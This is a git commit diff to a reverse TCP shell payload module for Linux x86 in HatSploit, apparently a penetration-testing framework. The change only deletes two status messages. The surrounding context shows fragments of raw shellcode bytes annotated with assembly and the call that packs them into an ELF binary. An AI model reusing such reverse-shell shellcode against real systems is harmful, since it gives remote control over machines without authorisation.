1529ae85bfe89f32fd5c94499c59fe80d4c43877
Ivan Nikolsky <enty8080@gmail.com>
2021-06-27 14:47:54 +0200

    Update shell_reverse_tcp.py

--- hatsploit/payloads/linux/x86/shell_reverse_tcp.py
+++ hatsploit/payloads/linux/x86/shell_reverse_tcp.py
@@ -51,7 +51,6 @@ class HatSploitPayload(Payload, HatVenom, TCPClient):
             'lport': local_port
         }
 
-        self.output_process("Generating shellcode...")
         shellcode = (
             b"\x31\xdb"              # xor ebx,ebx
             b"\xf7\xe3"              # mul ebx
@@ -90,7 +89,5 @@ class HatSploitPayload(Payload, HatVenom, TCPClient):
             b"\xcd\x80"              # int 0x80
         )
 
-        self.output_process("Generating payload...")
         payload = self.generate('elf', 'x86', shellcode, offsets)
-
         return payload
